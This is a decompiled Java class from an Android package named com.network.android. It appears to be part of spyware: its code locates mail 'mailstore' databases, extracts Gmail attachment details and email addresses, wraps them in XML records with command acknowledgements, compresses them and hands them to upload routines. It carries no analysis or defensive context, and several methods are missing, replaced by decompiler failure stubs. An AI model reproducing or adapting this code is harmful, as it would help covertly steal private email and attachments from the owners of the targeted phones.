package com.network.android;

import android.content.Context;
import android.os.Handler;
import android.util.Xml;
import com.network.android.c.a.a;
import com.network.android.c.a.b;
import com.network.i.e;
import java.io.ByteArrayOutputStream;
import java.io.StringWriter;
import java.util.HashMap;
import java.util.Vector;
import java.util.zip.Inflater;
import org.xmlpull.v1.XmlSerializer;

public final class r {

    /* renamed from: a  reason: collision with root package name */
    private static HashMap f109a;
    private static HashMap b;

    /* JADX WARNING: Code restructure failed: missing block: B:34:0x008f, code lost:
        r1.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:36:0x0093, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:37:0x0094, code lost:
        r1 = r2;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:38:0x0096, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:39:0x0097, code lost:
        r2 = null;
        r1 = r2;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Removed duplicated region for block: B:20:0x005a A[ORIG_RETURN, RETURN, SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:30:0x0087  */
    /* JADX WARNING: Removed duplicated region for block: B:34:0x008f  */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x0093 A[ExcHandler: all (th java.lang.Throwable), Splitter:B:7:0x003a] */
    /* JADX WARNING: Removed duplicated region for block: B:42:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static java.lang.String a(java.lang.String r6, android.database.sqlite.SQLiteDatabase r7) {
        /*
        // Method dump skipped, instructions count: 160
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.r.a(java.lang.String, android.database.sqlite.SQLiteDatabase):java.lang.String");
    }

    public static String a(String str, String str2, int i, int i2, Object obj) {
        try {
            a.a("getAttachmentFileCommand buildRecordFileHeader totalFiles: " + i2 + " fileNum: " + i);
            HashMap hashMap = (HashMap) obj;
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter = new StringWriter();
            SmsReceiver.a(newSerializer, stringWriter);
            newSerializer.startTag("", "emails");
            newSerializer.startTag("", "emailEntry");
            String a2 = m.a(str);
            newSerializer.attribute("", "recordId", (String) hashMap.get("recordId"));
            newSerializer.attribute("", "timestamp", (String) hashMap.get("timestamp"));
            newSerializer.startTag("", "attData");
            newSerializer.startTag("", "att");
            newSerializer.attribute("", "attRecordId", (String) hashMap.get("attRecordId"));
            newSerializer.attribute("", "contentType", (String) hashMap.get("contentType"));
            newSerializer.attribute("", "filename", (String) hashMap.get("filename"));
            newSerializer.attribute("", "length", (String) hashMap.get("length"));
            newSerializer.attribute("", "file", str2);
            newSerializer.attribute("", "isCompressed", "true");
            newSerializer.attribute("", "commandAck", (String) hashMap.get("commandAck"));
            newSerializer.attribute("", "timestamp", a2);
            newSerializer.attribute("", "totalFiles", Integer.toString(i2));
            newSerializer.attribute("", "fileNum", Integer.toString(i));
            newSerializer.endTag("", "att");
            newSerializer.endTag("", "attData");
            newSerializer.endTag("", "emailEntry");
            newSerializer.endTag("", "emails");
            SmsReceiver.a(newSerializer);
            a.a("getAttachmentFileCommand buildRecordFileHeader end");
            return stringWriter.toString();
        } catch (Throwable th) {
            a.a("getAttachmentFileCommand buildRecordFileHeader exception: " + th.getMessage(), th);
            return null;
        }
    }

    public static void a(Context context, Handler handler) {
        a(context, handler, true, 1);
        a(context, handler, true, 0);
    }

    public static void a(Context context, Handler handler, boolean z, int i) {
        handler.post(new s(z, i, context));
    }

    private static void a(Context context, StringWriter stringWriter, Vector vector, Vector vector2) {
        String[] strArr = (String[]) vector2.toArray(new String[vector2.size()]);
        byte[][] bArr = new byte[vector.size()][];
        for (int i = 0; i < vector.size(); i++) {
            bArr[i] = ((String) vector.elementAt(i)).getBytes();
        }
        j.a(stringWriter.toString(), strArr, bArr, context);
    }

    /* JADX WARNING: Removed duplicated region for block: B:22:0x009c  */
    /* JADX WARNING: Removed duplicated region for block: B:35:0x0155  */
    /* JADX WARNING: Removed duplicated region for block: B:39:0x0163  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void a(android.content.Context r14, java.lang.String r15, android.database.Cursor r16, android.database.sqlite.SQLiteDatabase r17, java.lang.String r18, int r19) {
        /*
        // Method dump skipped, instructions count: 599
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.r.a(android.content.Context, java.lang.String, android.database.Cursor, android.database.sqlite.SQLiteDatabase, java.lang.String, int):void");
    }

    static /* synthetic */ void a(String str, String str2, Context context, String str3, String str4, String str5, String str6, String str7, String str8, byte[] bArr) {
        a.a("getAttachmentFileCommand addAttchmentData");
        XmlSerializer newSerializer = Xml.newSerializer();
        StringWriter stringWriter = new StringWriter();
        SmsReceiver.a(newSerializer, stringWriter);
        newSerializer.startTag("", "emails");
        newSerializer.startTag("", "emailEntry");
        String a2 = m.a(str4);
        newSerializer.attribute("", "recordId", str);
        newSerializer.attribute("", "timestamp", a2);
        newSerializer.startTag("", "attData");
        newSerializer.startTag("", "att");
        newSerializer.attribute("", "attRecordId", str8);
        newSerializer.attribute("", "contentType", str7);
        newSerializer.attribute("", "filename", str5);
        newSerializer.attribute("", "length", str6);
        newSerializer.attribute("", "file", str2);
        newSerializer.attribute("", "isCompressed", "true");
        newSerializer.attribute("", "commandAck", str3);
        newSerializer.attribute("", "timestamp", a2);
        newSerializer.attribute("", "totalFiles", Integer.toString(1));
        newSerializer.attribute("", "fileNum", Integer.toString(1));
        newSerializer.endTag("", "att");
        newSerializer.endTag("", "attData");
        newSerializer.endTag("", "emailEntry");
        newSerializer.endTag("", "emails");
        SmsReceiver.a(newSerializer);
        String[] strArr = {str2};
        byte[][] bArr2 = {g.a(bArr).toByteArray()};
        if (str3 != null) {
            b.a(str3);
        }
        j.a(stringWriter.toString(), strArr, bArr2, context);
    }

    public static void a(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8) {
        a.a("getAttachmentFileCommand addAttchmentChunker");
        String a2 = m.a(str3);
        HashMap hashMap = new HashMap();
        hashMap.put("timestamp", a2);
        hashMap.put("recordId", str);
        hashMap.put("attRecordId", str7);
        hashMap.put("contentType", str6);
        hashMap.put("filename", str4);
        hashMap.put("length", str5);
        hashMap.put("isCompressed", "true");
        hashMap.put("commandAck", str2);
        String a3 = e.a(hashMap);
        if (str2 != null) {
            b.a(str2);
        }
        a.a("getAttachmentFileCommand addAttchmentChunker serializadMap: " + a3);
        com.network.i.b.a();
        com.network.i.b.a(str8, a2, 3, 1, a3);
    }

    /* JADX WARNING: Code restructure failed: missing block: B:13:0x009d, code lost:
        r0 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:14:0x009e, code lost:
        com.network.android.c.a.a.a("getEmailAccount addMailAttachments- " + r0.getMessage(), r0);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:30:0x010b, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:33:?, code lost:
        r6.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:35:0x0112, code lost:
        r1 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:36:0x0113, code lost:
        com.network.android.c.a.a.a("GetContentMail addMailAttachments finaly- " + r1.getMessage(), r1);
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Removed duplicated region for block: B:20:0x00cf A[SYNTHETIC, Splitter:B:20:0x00cf] */
    /* JADX WARNING: Removed duplicated region for block: B:30:0x010b A[ExcHandler: all (th java.lang.Throwable), Splitter:B:4:0x0034] */
    /* JADX WARNING: Removed duplicated region for block: B:32:0x010e A[SYNTHETIC, Splitter:B:32:0x010e] */
    /* JADX WARNING: Removed duplicated region for block: B:49:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static void a(org.xmlpull.v1.XmlSerializer r7, android.database.sqlite.SQLiteDatabase r8, java.lang.String r9, java.lang.String r10) {
        /*
        // Method dump skipped, instructions count: 328
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.r.a(org.xmlpull.v1.XmlSerializer, android.database.sqlite.SQLiteDatabase, java.lang.String, java.lang.String):void");
    }

    private static void a(XmlSerializer xmlSerializer, String str, String str2) {
        a.a("GetContentMail addGMailAttachments");
        try {
            String[] split = str2.split("\n");
            if (split != null) {
                a.a("GetContentMail addGMailAttachments size: " + split.length);
                xmlSerializer.startTag("", "attData");
                for (int i = 0; i < split.length; i++) {
                    try {
                        String str3 = split[i];
                        a.a("GetContentMail addGMailAttachments joinedAttachmentInfo: " + str3);
                        String[] split2 = str3.split("\\|");
                        if (split2 != null) {
                            String str4 = split2[1];
                            a(xmlSerializer, str, str4, split2[3], split2[2], split2[6]);
                            a.a("GetContentMail addGMailAttachments attachment filename: " + str4);
                        }
                    } catch (Throwable th) {
                        a.a("get mail getEmailAccount addMailAttachments- " + th.getMessage(), th);
                    }
                }
                xmlSerializer.endTag("", "attData");
            }
        } catch (Throwable th2) {
            a.a("GetContentMail addGMailAttachments error- " + th2.getMessage(), th2);
        }
    }

    private static void a(XmlSerializer xmlSerializer, String str, String str2, String str3, String str4, String str5) {
        xmlSerializer.startTag("", "att");
        xmlSerializer.attribute("", "attRecordId", str5);
        xmlSerializer.attribute("", "contentType", str4);
        xmlSerializer.attribute("", "filename", str2);
        xmlSerializer.attribute("", "length", str3);
        xmlSerializer.attribute("", "timestamp", str);
        xmlSerializer.endTag("", "att");
    }

    public static boolean a(String str) {
        return str.contains("mailstore") && str.endsWith("db");
    }

    /* JADX WARNING: Code restructure failed: missing block: B:74:0x040b, code lost:
        if (r2.length() == 0) goto L_0x040d;
     */
    /* JADX WARNING: Removed duplicated region for block: B:31:0x0203  */
    /* JADX WARNING: Removed duplicated region for block: B:44:0x02af  */
    /* JADX WARNING: Removed duplicated region for block: B:84:0x045c  */
    /* JADX WARNING: Removed duplicated region for block: B:86:0x0466  */
    /* JADX WARNING: Removed duplicated region for block: B:88:0x0475  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static boolean a(org.xmlpull.v1.XmlSerializer r17, android.database.Cursor r18, java.util.Vector r19, java.util.Vector r20, android.database.sqlite.SQLiteDatabase r21, android.database.sqlite.SQLiteDatabase r22, java.lang.String r23, int r24, java.lang.String r25) {
        /*
        // Method dump skipped, instructions count: 1262
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.r.a(org.xmlpull.v1.XmlSerializer, android.database.Cursor, java.util.Vector, java.util.Vector, android.database.sqlite.SQLiteDatabase, android.database.sqlite.SQLiteDatabase, java.lang.String, int, java.lang.String):boolean");
    }

    private static byte[] a(Inflater inflater) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] bArr = new byte[1024];
        while (true) {
            int inflate = inflater.inflate(bArr);
            if (inflate == 0) {
                return byteArrayOutputStream.toByteArray();
            }
            byteArrayOutputStream.write(bArr, 0, inflate);
        }
    }

    private static byte[] a(byte[] bArr) {
        Inflater inflater = new Inflater();
        try {
            inflater.setInput(bArr, 0, bArr.length);
            return a(inflater);
        } finally {
            inflater.end();
        }
    }

    private static String b(String str) {
        return str == null ? str : str.replaceAll("\n", "\n ");
    }

    /* JADX WARNING: Code restructure failed: missing block: B:19:0x0058, code lost:
        if (r2 != null) goto L_0x005a;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:20:0x005a, code lost:
        r2.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:21:0x005d, code lost:
        com.network.android.c.a.a.a("get mail getEmailAccount name: " + r0);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:22:0x006f, code lost:
        if (r0 != null) goto L_?;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:23:0x0071, code lost:
        com.network.android.c.a.a.a("get mail getEmailAccount name get nothing => set to Gmail: " + "Gmail");
     */
    /* JADX WARNING: Code restructure failed: missing block: B:36:0x00cc, code lost:
        if (r2 != null) goto L_0x005a;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:51:?, code lost:
        return "Gmail";
     */
    /* JADX WARNING: Code restructure failed: missing block: B:52:?, code lost:
        return r0;
     */
    /* JADX WARNING: Removed duplicated region for block: B:39:0x00d2  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static java.lang.String b(java.lang.String r6, android.database.sqlite.SQLiteDatabase r7) {
        /*
        // Method dump skipped, instructions count: 237
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.r.b(java.lang.String, android.database.sqlite.SQLiteDatabase):java.lang.String");
    }

    private static String c(String str) {
        if (str == null) {
            return str;
        }
        try {
            if (str.length() == 0) {
                return str;
            }
            StringBuilder sb = new StringBuilder();
            for (String str2 : str.split("\u0001")) {
                String[] split = str2.split("\u0002");
                if (split.length == 2) {
                    sb.append(split[1]);
                    sb.append(" <" + split[0] + ">");
                } else {
                    sb.append(split[0]);
                }
                sb.append(" ");
            }
            return sb.toString();
        } catch (Throwable th) {
            a.a("get Mail refactorMailAddresses- " + th.getMessage(), th);
            return str;
        }
    }
}
